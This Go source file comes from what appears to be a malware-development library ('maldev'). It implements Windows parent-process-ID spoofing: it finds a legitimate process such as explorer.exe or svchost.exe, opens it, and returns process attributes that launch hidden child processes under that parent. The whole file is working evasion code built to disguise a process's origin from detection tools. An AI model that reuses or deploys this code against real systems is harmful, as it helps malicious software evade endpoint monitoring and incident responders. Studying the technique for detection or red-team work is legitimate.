//go:build windows

package shell

import (
	"fmt"
	"syscall"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/process/enum"
)

// DefaultPPIDTargets are common legitimate parent processes for PPID spoofing.
var DefaultPPIDTargets = []string{
	"explorer.exe",
	"svchost.exe",
	"sihost.exe",
	"RuntimeBroker.exe",
}

// PPIDSpoofer provides PPID spoofing capabilities.
// After calling FindTargetProcess, use SysProcAttr to get a configured
// *syscall.SysProcAttr that spawns child processes under the target parent.
type PPIDSpoofer struct {
	targetPID uint32
	// Targets is the list of process names to search for (first match wins).
	// If empty, DefaultPPIDTargets is used.
	Targets []string
}

// NewPPIDSpoofer creates a new PPIDSpoofer with default targets.
func NewPPIDSpoofer() *PPIDSpoofer {
	return &PPIDSpoofer{}
}

// NewPPIDSpooferWithTargets creates a PPIDSpoofer with custom target processes.
func NewPPIDSpooferWithTargets(targets []string) *PPIDSpoofer {
	return &PPIDSpoofer{Targets: targets}
}

// FindTargetProcess finds a suitable legitimate parent process.
func (p *PPIDSpoofer) FindTargetProcess() error {
	targets := p.Targets
	if len(targets) == 0 {
		targets = DefaultPPIDTargets
	}

	for _, target := range targets {
		procs, err := enum.FindByName(target)
		if err == nil && len(procs) > 0 {
			p.targetPID = procs[0].PID
			return nil
		}
	}

	return fmt.Errorf("no suitable parent process found")
}

// TargetPID returns the selected target process ID.
func (p *PPIDSpoofer) TargetPID() uint32 {
	return p.targetPID
}

// SysProcAttr returns a *syscall.SysProcAttr configured to spawn the child
// process under the target parent via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
//
// The returned handle must be closed by the caller after the child starts:
//
//	attr, handle, _ := spoofer.SysProcAttr()
//	defer windows.CloseHandle(handle)
//	cmd.SysProcAttr = attr
//	cmd.Start()
func (p *PPIDSpoofer) SysProcAttr() (*syscall.SysProcAttr, windows.Handle, error) {
	if p.targetPID == 0 {
		return nil, 0, fmt.Errorf("no target PID selected")
	}

	// Open the target process with PROCESS_CREATE_PROCESS — the minimum
	// right needed for PPID spoofing via ParentProcess attribute.
	parentHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_PROCESS,
		false,
		p.targetPID,
	)
	if err != nil {
		return nil, 0, fmt.Errorf("open parent process: %w", err)
	}

	// Go 1.24+ syscall.SysProcAttr.ParentProcess wires through
	// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS automatically.
	return &syscall.SysProcAttr{
		HideWindow:    true,
		ParentProcess: syscall.Handle(parentHandle),
	}, parentHandle, nil
}

// ParentPID returns the parent process ID of the given PID.
func ParentPID(pid uint32) (uint32, error) {
	proc, err := enum.FindProcess(func(_ string, p, _ uint32) bool {
		return p == pid
	})
	if err != nil {
		return 0, fmt.Errorf("target process not found")
	}
	return proc.PPID, nil
}
